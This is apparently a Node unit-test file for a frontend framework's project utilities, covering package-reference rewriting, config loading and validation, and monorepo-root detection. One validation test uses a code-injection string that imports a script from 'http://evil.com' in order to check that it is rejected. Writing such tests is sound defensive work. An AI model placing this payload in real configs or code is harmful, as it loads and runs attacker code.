/**
 * Unit tests for project utilities
 *
 * Run with: node --import tsx --test src/utils/project.test.ts
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import path from 'path';
import fs from 'fs-extra';
import os from 'os';
import { loadConfig, findMonorepoRoot, getLocalPackageRef, CONFIG_FILE } from './project.js';

describe('getLocalPackageRef', () => {
  it('should convert @gears-frontx/react to a file: reference', () => {
    const result = getLocalPackageRef('@gears-frontx/react', '/repo', '/repo/app');
    assert.equal(result, 'file:../packages/react');
  });

  it('should convert @gears-frontx/framework to a file: reference', () => {
    const result = getLocalPackageRef('@gears-frontx/framework', '/repo', '/repo/app');
    assert.equal(result, 'file:../packages/framework');
  });

  it('should handle nested project paths', () => {
    const result = getLocalPackageRef('@gears-frontx/state', '/repo', '/repo/projects/my-app');
    assert.equal(result, 'file:../../packages/state');
  });

  it('should return non-@gears-frontx packages unchanged', () => {
    assert.equal(getLocalPackageRef('react', '/repo', '/repo/app'), 'react');
    assert.equal(getLocalPackageRef('lodash', '/repo', '/repo/app'), 'lodash');
    assert.equal(getLocalPackageRef('@types/node', '/repo', '/repo/app'), '@types/node');
  });
});

describe('loadConfig', () => {
  let tmpDir: string;

  before(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'hai3-test-loadconfig-'));
  });

  after(async () => {
    await fs.remove(tmpDir);
  });

  it('should return not_found when config file does not exist', async () => {
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'not_found');
    assert.match((result as { message: string }).message, /not found/);
  });

  it('should load a valid config', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 'shadcn' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { hai3: true, uikit: 'shadcn' });
    await fs.remove(configPath);
  });

  it('should load config with uikit "none"', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 'none' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { hai3: true, uikit: 'none' });
    await fs.remove(configPath);
  });

  it('should return invalid for empty string uikit', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: '' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /Invalid "uikit" value/);
    await fs.remove(configPath);
  });

  it('should return invalid for non-string uikit', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 123 }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /Invalid "uikit" value/);
    await fs.remove(configPath);
  });

  it('should return config when uikit is not present', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { hai3: true });
    await fs.remove(configPath);
  });

  it('should load config with a custom uikit package', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: '@acronis-platform/shadcn-uikit' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, true);
    assert.deepEqual((result as { config: unknown }).config, { hai3: true, uikit: '@acronis-platform/shadcn-uikit' });
    await fs.remove(configPath);
  });

  it('should return invalid for uikit with invalid npm package-name syntax', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: "'; import('http://evil.com/x');" }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /not a valid npm package name/);
    await fs.remove(configPath);
  });

  it('should return invalid for uikit with spaces', async () => {
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 'bad package name' }));
    const result = await loadConfig(tmpDir);
    assert.equal(result.ok, false);
    assert.equal((result as { error: string }).error, 'invalid');
    assert.match((result as { message: string }).message, /not a valid npm package name/);
    await fs.remove(configPath);
  });
});

describe('findMonorepoRoot', () => {
  let tmpDir: string;

  before(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'hai3-test-monorepo-'));
  });

  after(async () => {
    delete process.env.GEARS_FRONTX_MONOREPO_ROOT;
    await fs.remove(tmpDir);
  });

  it('should return null when no monorepo structure is found', async () => {
    delete process.env.GEARS_FRONTX_MONOREPO_ROOT;
    const leaf = path.join(tmpDir, 'some', 'deep', 'path');
    await fs.ensureDir(leaf);
    const result = await findMonorepoRoot(leaf);
    assert.equal(result, null);
  });

  it('should find monorepo root with packages/react and workspaces', async () => {
    delete process.env.GEARS_FRONTX_MONOREPO_ROOT;
    const monoRoot = path.join(tmpDir, 'mono');
    await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@gears-frontx/react' });
    await fs.writeJson(path.join(monoRoot, 'package.json'), {
      name: 'gears-frontx-monorepo',
      workspaces: ['packages/*'],
    });

    const childDir = path.join(monoRoot, 'apps', 'my-app');
    await fs.ensureDir(childDir);

    const result = await findMonorepoRoot(childDir);
    assert.equal(result, monoRoot);
  });

  it('should respect GEARS_FRONTX_MONOREPO_ROOT env variable', async () => {
    const monoRoot = path.join(tmpDir, 'env-mono');
    await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@gears-frontx/react' });

    process.env.GEARS_FRONTX_MONOREPO_ROOT = monoRoot;

    const result = await findMonorepoRoot('/some/random/path');
    assert.equal(result, path.resolve(monoRoot));

    delete process.env.GEARS_FRONTX_MONOREPO_ROOT;
  });

  it('should skip directories without workspaces containing packages/', async () => {
    delete process.env.GEARS_FRONTX_MONOREPO_ROOT;
    const fakeRoot = path.join(tmpDir, 'fake-mono');
    await fs.ensureDir(path.join(fakeRoot, 'packages', 'react'));
    await fs.writeJson(path.join(fakeRoot, 'packages', 'react', 'package.json'), { name: '@gears-frontx/react' });
    await fs.writeJson(path.join(fakeRoot, 'package.json'), {
      name: 'not-a-monorepo',
      workspaces: ['apps/*'],
    });

    const child = path.join(fakeRoot, 'apps', 'test');
    await fs.ensureDir(child);

    const result = await findMonorepoRoot(child);
    assert.equal(result, null);
  });
});
